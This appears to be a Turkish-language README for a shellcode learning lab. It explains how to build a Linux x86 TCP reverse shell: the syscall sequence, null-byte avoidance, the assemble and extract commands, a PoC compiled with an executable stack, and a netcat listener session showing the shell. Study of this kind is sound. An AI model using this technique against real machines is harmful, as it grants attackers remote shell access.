# Lab 03: TCP Reverse Shell — Linux x86 Shellcode

Bu laboratuvar çalışmasında, Linux x86 (32-bit) mimarisi üzerinde hedef makineden saldırgan makinesine bağlantı kuran, standart I/O kanallarını yönlendiren ve bir kabuk (`/bin/sh`) tetikleyen **TCP Reverse Shell** shellcode'u geliştirilmiş; C harness üzerinden test edilmiştir.

---

## Sistem Çağrıları (Syscalls) ve Akış

Reverse shell dört aşamalı bir pipeline üzerinde çalışır:

| Adım | İşlem | Syscall / Çağrı | Açıklama |
|---|---|---|---|
| 1 | Socket Aç | `socketcall` → `socket()` | TCP soketi oluşturulur (`AF_INET`, `SOCK_STREAM`) |
| 2 | Bağlan | `socketcall` → `connect()` | Hedef IP:Port'a bağlantı kurulur |
| 3 | Kanal Yönlendirme | `sys_dup2` (`0x3f`) | `stdin`, `stdout`, `stderr` soket fd'sine yönlendirilir |
| 4 | Kabuk Tetikle | `sys_execve` (`0x0b`) | `/bin/sh` çalıştırılır |

---

## Düşük Seviyeli Mimari ve Teknik Notlar

### 1. socketcall (0x66) — Linux x86 Socket Arayüzü

Linux x86'da tüm soket işlemleri (`socket`, `connect`, `bind` vb.) tek bir sistem çağrısı üzerinden yürütülür: `sys_socketcall`. Hangi soket fonksiyonunun çağrılacağı `ebx` register'ındaki alt çağrı numarasıyla belirlenir; argümanlar ise `ecx` register'ının gösterdiği stack adresinden okunur.

### 2. IP Adresi ve Null-Free Sorunu

`127.0.0.1` adresinin son okteti `0x00` olduğundan shellcode içinde null byte oluşturur. Bunu önlemek için bağlantı adresi `127.1.1.1` olarak ayarlanmıştır — loopback aralığındaki herhangi bir adres `localhost`'a yönlendirildiğinden işlevsel fark yoktur.

### 3. dup2 ile Kanal Yönlendirme

`sys_dup2` çağrısı üç kez çalıştırılır: `stdin` (fd 0), `stdout` (fd 1) ve `stderr` (fd 2) soket dosya tanımlayıcısına (fd) bağlanır. Bu sayede `/bin/sh` üzerindeki tüm I/O trafiği TCP bağlantısı üzerinden akar.

---

## Dosya Yapısı

```
.
├── tcp_rev_sh.asm  # TCP reverse shell mantığını barındıran Assembly kaynak kodu
└── poc.c           # Shellcode'u bellek üzerinde pointer manipülasyonu ile tetikleyen C harness kodu
```

---

## Adım Adım Uygulama

### 1. Kaynak Kodun Derlenmesi (Assemble)

```bash
nasm -f elf32 tcp_rev_sh.asm -o tcp_rev_sh.o
```

### 2. Shellcode Oluşturma (Opcode Extraction)

```bash
objdump -d tcp_rev_sh.o | grep "^ " | cut -f 2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/\\x&/g'
```

### 3. PoC Derleme

```bash
gcc poc.c -m32 -z execstack
```

---

## Test ve Doğrulama

Test için iki terminal açılır: biri `netcat` ile dinleme modunda bekler, diğeri PoC'u çalıştırır.

**Terminal 1 — Dinleyici:**

```bash
nc -nvlp 4444
```

**Terminal 2 — PoC:**

```bash
./a.out
```

Bağlantı kurulduğunda dinleyici terminalde interaktif kabuk oturumu başlar:

```
ataberk@ataberkpc:~$ nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 57368
whoami
ataberk
pwd
/home/ataberk/shellcode0/linux-shc-lab/lab03-tcp_rev_sh
ls
a.out
poc.c
tcp_rev_sh.asm
tcp_rev_sh.o
^C
ataberk@ataberkpc:~$
```
